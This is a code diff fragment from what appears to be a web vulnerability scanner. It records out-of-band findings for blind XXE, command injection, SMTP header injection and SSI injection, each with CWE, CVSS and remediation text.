+                        sources="fracture-oob", service=target["scheme"],
+                        affected=_hit_url, owasp="A03:2025 Injection", nist="SI-10",
+                        remediation=(
+                            "Disable external entity and DTD processing in all XML "
+                            "parsers. Use defused XML libraries. Validate XML input "
+                            "against a strict schema before processing."
+                        ),
+                        cwe=["CWE-611"],
+                        cvss_score=9.1,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                    )
+                    vc.log(f"[oob] BLIND XXE confirmed: {_hit_url}", "SUCCESS")
+
+                elif _hit_type == "blind_cmdi":
+                    out.add_finding(
+                        title="Injection: Blind Command Injection (OOB)",
+                        url=_hit_url, port=target["port"], risk="CRITICAL",
+                        description=(
+                            _oob_desc_base + " The server executed a command that "
+                            "contacted the OOB callback, confirming blind OS command "
+                            "injection. An attacker can execute arbitrary commands on "
+                            "the server operating system."
+                        ),
+                        output=(f"OOB Type: Blind CMDi\nParameter: {_hit_param}\n"
+                                f"Callback from: {_hit_remote}\nProtocol: {_hit_proto}"),
+                        sources="fracture-oob", service=target["scheme"],
+                        affected=_hit_url, owasp="A03:2025 Injection", nist="SI-10",
+                        remediation=(
+                            "Never pass user input to OS command interpreters. Use "
+                            "language-native APIs instead of shell commands. If shell "
+                            "execution is unavoidable, use strict input validation "
+                            "and parameterised command construction."
+                        ),
+                        cwe=["CWE-78"],
+                        cvss_score=9.8,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                    )
+                    vc.log(f"[oob] BLIND CMDi confirmed: {_hit_url} param={_hit_param}", "SUCCESS")
+
+                elif _hit_type == "smtp_header":
+                    out.add_finding(
+                        title="SMTP Header Injection",
+                        url=_hit_url, port=target["port"], risk="HIGH",
+                        description=(
+                            _oob_desc_base + " The application's mail-sending "
+                            "functionality accepted injected SMTP headers, allowing "
+                            "an attacker to add arbitrary recipients, modify headers, "
+                            "or use the server as a spam relay."
+                        ),
+                        output=(f"OOB Type: SMTP Header Injection\nParameter: {_hit_param}\n"
+                                f"Callback from: {_hit_remote}"),
+                        sources="fracture-oob", service=target["scheme"],
+                        affected=_hit_url, owasp="A03:2025 Injection", nist="SI-10",
+                        remediation=(
+                            "Sanitise all user input used in email headers. Strip "
+                            "CR/LF characters. Use a dedicated email library that "
+                            "handles header encoding safely. Never construct raw "
+                            "SMTP headers from user input."
+                        ),
+                        cwe=["CWE-93"],
+                        cvss_score=6.5,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                    )
+                    vc.log(f"[oob] SMTP header injection confirmed: {_hit_url} param={_hit_param}", "SUCCESS")
+
+                elif _hit_type == "ssi":
+                    out.add_finding(
+                        title="Server-Side Include (SSI) Injection",
+                        url=_hit_url, port=target["port"], risk="HIGH",
+                        description=(
+                            _oob_desc_base + " The server processed an SSI directive "
+                            "that executed a command contacting the OOB callback, "
+                            "confirming SSI injection. An attacker can include files, "
+                            "execute commands, or access server variables."
+                        ),
+                        output=(f"OOB Type: SSI Injection\nParameter: {_hit_param}\n"
+                                f"Callback from: {_hit_remote}\nProtocol: {_hit_proto}"),
+                        sources="fracture-oob", service=target["scheme"],
+                        affected=_hit_url, owasp="A03:2025 Injection", nist="SI-10",
+                        remediation=(
+                            "Disable SSI processing or restrict it to trusted "
+                            "content only. Never allow user input to reach SSI-enabled "
+                            "pages. If SSI is required, use the 'exec' disable option "
+                            "in server configuration."
+                        ),
+                        cwe=["CWE-97"],
+                        cvss_score=7.5,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                    )
+                    vc.log(f"[oob] SSI injection confirmed: {_hit_url} param={_hit_param}", "SUCCESS")
+
+            if not _oob_hits:
+                vc.log("[oob] No OOB callbacks received (clean)", "INFO")
+
+            _oob_cleanup()
+    else:
+        vc.log("[oob] OOB testing disabled (no oob_callback_url configured)", "INFO")
 
     vc.status(phase, "Injection Testing", "complete", "Done", 28, 28)
     vc.log("[injection] Phase complete", "SUCCESS")
